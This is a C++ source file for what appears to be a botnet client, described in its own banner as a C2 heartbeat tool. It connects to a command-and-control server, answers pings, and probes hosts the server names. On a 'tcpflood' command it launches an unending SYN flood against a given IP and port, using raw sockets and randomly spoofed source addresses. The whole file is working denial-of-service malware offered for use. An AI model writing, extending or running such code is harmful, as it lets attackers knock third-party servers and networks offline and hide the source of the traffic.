#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#define PACKET_LEN 1500

// Compute TCP checksum (including pseudo header)
unsigned short calculate_tcp_checksum(struct iphdr *ip) {
    struct tcphdr *tcp = (struct tcphdr *)((char *)ip + (ip->ihl << 2));
    int tcp_len = ntohs(ip->tot_len) - (ip->ihl << 2);
    
    struct pseudo_header {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t reserved;
        uint8_t protocol;
        uint16_t tcp_length;
    } pseudo;
    
    pseudo.src_addr = ip->saddr;
    pseudo.dst_addr = ip->daddr;
    pseudo.reserved = 0;
    pseudo.protocol = IPPROTO_TCP;
    pseudo.tcp_length = htons(tcp_len);
    
    int total_len = sizeof(pseudo) + tcp_len;
    char *buffer = new char[total_len];
    memcpy(buffer, &pseudo, sizeof(pseudo));
    memcpy(buffer + sizeof(pseudo), tcp, tcp_len);
    
    unsigned long sum = 0;
    uint16_t *addr = (uint16_t *)buffer;
    for (int i = 0; i < total_len / 2; i++)
        sum += addr[i];
    if (total_len % 2)
        sum += ((uint16_t *)buffer)[total_len - 1];
    
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    
    delete[] buffer;
    return (unsigned short)(~sum);
}


// Send raw IP packet
void send_raw_ip_packet(char *packet, int packet_len, struct sockaddr_in *dest) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return;
    }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return;
    }
    if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)dest, sizeof(*dest)) < 0) {
        perror("sendto");
    }
    close(sock);
}

// Main function: performs SYN flood against target host:port
void tcpflood(std::string target, int port) {
    // DNS resolution
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(target.c_str(), nullptr, &hints, &res) != 0) {
        std::cerr << "DNS resolution failed for: " << target << std::endl;
        return;
    }
    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    uint32_t dest_ip = addr->sin_addr.s_addr;
    freeaddrinfo(res);
    
    std::cout << "Flooding " << target << " (" << inet_ntoa(*(struct in_addr*)&dest_ip) << ":" << port << ")" << std::endl;
    
    char buffer[PACKET_LEN];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));
    
    srand(time(nullptr));
    
    while (true) {
        memset(buffer, 0, PACKET_LEN);
        
        // TCP header
        tcp->source = htons(rand() % 65535 + 1);
        tcp->dest = htons(port);
        tcp->seq = rand();
        tcp->doff = 5;  // 5 words = 20 bytes
        tcp->syn = 1;
        tcp->window = htons(20000);
        tcp->check = 0;
        
        // IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = rand();
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = rand();  // spoofed source IP
        ip->daddr = dest_ip;
        ip->check = 0;       // IP checksum not needed for raw socket with IP_HDRINCL
        
        // TCP checksum
        tcp->check = calculate_tcp_checksum(ip);
        
        // Destination info
        struct sockaddr_in dest_info;
        dest_info.sin_family = AF_INET;
        dest_info.sin_addr = addr->sin_addr;
        
        send_raw_ip_packet(buffer, ntohs(ip->tot_len), &dest_info);
    }
}


void dnsHandler(std::string& target) {
    struct addrinfo hints, *res;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;      // IPv4
    hints.ai_socktype = SOCK_STREAM;

    int status = getaddrinfo(target.c_str(), NULL, &hints, &res);
    if (status != 0) {
        std::cout << "DNS error: " << gai_strerror(status) << std::endl;
        return;
    }

    char ip[INET_ADDRSTRLEN];
    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;

    inet_ntop(AF_INET, &(addr->sin_addr), ip, sizeof(ip));

    std::cout << "IP: " << ip << std::endl;

    freeaddrinfo(res);
}

int ping(std::string target) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;      
    hints.ai_socktype = SOCK_STREAM; 

    const char* port = "80"; 

    if (getaddrinfo(target.c_str(), port, &hints, &res) != 0) {
        return -1;
    }

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == -1) {
        freeaddrinfo(res);
        return -1;
    }


    if (connect(sock, res->ai_addr, res->ai_addrlen) == -1) {
        close(sock);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    close(sock);
    return 0;
}

int main() {
    std::system("clear");
    std::cout << "lightweight socket connection like a c2 with heartbeats\nby wispedcats\n" << std::endl;

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        std::cerr << "error creating socket" << std::endl;
        return 1;
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(4959);

    if (inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr) <= 0) {
        std::cerr << "error: unavailable address" << std::endl;
        close(clientSocket);
        return 1;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) <= -1) {
        std::cerr << "error: connection failed!" << std::endl;
        close(clientSocket);
        return 1;
    }

    std::cout << "connected to C2 server" << std::endl;

    std::string message = "ping";
    send(clientSocket, message.c_str(), message.length(), 0);

    while (true) {
        char puffer[1024] = {0};
        int receivedBytes = recv(clientSocket, puffer, 1024, 0);

        if (receivedBytes > 0) {
            std::string receivedData(puffer);
            std::cout << "received from server: " << receivedData << std::endl;

            

            if (receivedData == "ping") {
                send(clientSocket, "pong", 4, 0);
            } 
            else if (receivedData.rfind("tcpflood ", 0) == 0) {
                    try {
                        size_t space1 = receivedData.find(' ');
                        size_t space2 = receivedData.find(' ', space1 + 1);

                        std::string protocol = receivedData.substr(0, space1);
                        std::string ip = receivedData.substr(space1 + 1, space2 - space1 - 1);
                        int port = std::stoi(receivedData.substr(space2 + 1));
                        std::cout << protocol << std::endl; 
                        std::cout << ip << std::endl;       
                        std::cout << port << std::endl;
                        
                        tcpflood(ip, port);
                    }
                    catch (...) {
                        std::cout << "Syntax: tcp <ip> <port>" << std::endl;
                    }
                }
            else {
                if (ping(receivedData) == 0) {
                    std::string res = "Target " + receivedData + " is online";
                    send(clientSocket, res.c_str(), res.length(), 0);
                } else {
                    std::string res = "Target " + receivedData + " is offline/DEAD";
                    send(clientSocket, res.c_str(), res.length(), 0);
                }
            }
        } else if (receivedBytes == 0) {
            std::cout << "server closed connection" << std::endl;
            break;
        } else {
            std::cerr << "connection error" << std::endl;
            break;
        }
    }

    close(clientSocket);
    return 0;
}